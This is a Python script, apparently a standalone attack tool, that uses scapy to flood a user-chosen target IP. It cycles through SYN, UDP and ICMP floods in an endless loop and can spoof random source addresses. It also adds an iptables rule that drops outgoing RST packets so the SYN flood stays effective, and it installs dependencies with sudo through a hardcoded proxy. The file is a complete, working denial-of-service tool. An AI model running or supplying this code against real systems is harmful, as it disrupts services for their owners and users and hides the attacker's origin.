import os
import sys

try:
    import netifaces
except ImportError:
    os.system('sudo pip3 install netifaces --proxy="http://10.50.128.110:3128"')
    import netifaces

try:
    from scapy.all import *
except ImportError:
    os.system('sudo pip3 install scapy --proxy="http://10.50.128.110:3128"')
    from scapy.all import *
from scapy.layers.inet import *

# verify that the user running the script is root
if os.getuid() != 0:
    print('You need to run this program as root')
    sys.exit(1)

# input the parameters to attack
dst_ip = input('Input IP :')
tcp_port = input('Attack Port of SYN Flood :')
udp_port = input('Attack Port of UDP Flood :')
src_type = input('Choose random or local source ip, please input r or l: ')
pack_count = int(input('Number of packets sent at a time (num>=3000) :'))

# get the default gateway and nicname
routingGateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
routingNicName = netifaces.gateways()['default'][netifaces.AF_INET][1]

# list the all interface and select the one to send packets
ifaces_info = {}

print("The interfaces of local host are given below:")

for interface in netifaces.interfaces():
    try:
        routingIPAddr = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        routingIPNetmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
        ifaces_info[routingIPAddr] = (interface, routingIPNetmask)
        if interface == routingNicName:
            print('%s : {IP:%s, gateway:%s, netmask:%s}\n' % (interface, routingIPAddr, routingGateway, routingIPNetmask))
        else:
            print('%s : {IP:%s, netmask:%s}\n' % (interface, routingIPAddr, routingIPNetmask))
    except KeyError:
        pass

iface_ip = input('Please select the interface to send packets by inputting IP address:')
iface_name = ifaces_info[iface_ip][0]

# select the source IP type
src_ip = ""
if src_type == 'r' or src_type == 'R':
    src_ip = RandIP()
elif src_type == 'l' or src_type == 'L':
    src_ip = iface_ip

'''
By default the Linux kernel sends an RST in response to a SYN-ACK received from the server. 
This is because of a lack of communication between scapy and the kernel. 
For this reason an IPTABLES rule needs to be created to block any outgoing RST packets.
'''
os.system('iptables -A OUTPUT -p tcp -s %s --tcp-flags RST RST -j DROP' % src_ip)

# random packet size
tcp_header_size = 54
udp_header_size = 42
icmp_header_size = 42

def random_byte(length):
    random_byte = bytes(length)
    return random_byte

# create packet
ip_header = IP(src=src_ip, dst=dst_ip)
tcp_header = TCP(flags='S', sport=RandShort(), dport=int(tcp_port))
udp_header = UDP(sport=RandShort(), dport=int(udp_port))
icmp_header = ICMP(type=8)

def sendPack(proto, data):
    pack = ip_header / proto / data
    send(pack, iface=iface_name, count=pack_count, verbose=0)

# send packets
print('\nSending packets, please wait a moment! ! !')
sizes = [64, 128, 512]
proto_flag = 0
tcp_count = 0
udp_count = 0
icmp_count = 0
current_time = time.time()

while True:
    total_size = random.choice(sizes)

    if proto_flag == 0:
        payload_size = total_size - tcp_header_size
        data_tcp = random_byte(payload_size)
        sendPack(tcp_header, data_tcp)
        tcp_count += pack_count
    elif proto_flag == 1:
        payload_size = total_size - udp_header_size
        data_udp = random_byte(payload_size)
        sendPack(udp_header, data_udp)
        udp_count += pack_count
    elif proto_flag == 2:
        payload_size = total_size - icmp_header_size
        data_icmp = random_byte(payload_size)
        sendPack(icmp_header, data_icmp)
        icmp_count += pack_count

    nowtime = time.time()
    if nowtime - current_time >= 10:
        proto = {0: ('TCP', tcp_count), 1: ('UDP', udp_count), 2: ('ICMP', icmp_count)}
        print('Send %d %s packets to %s' % (proto[proto_flag][1], proto[proto_flag][0], dst_ip))
        proto_flag = (proto_flag + 1) % 3
        current_time = nowtime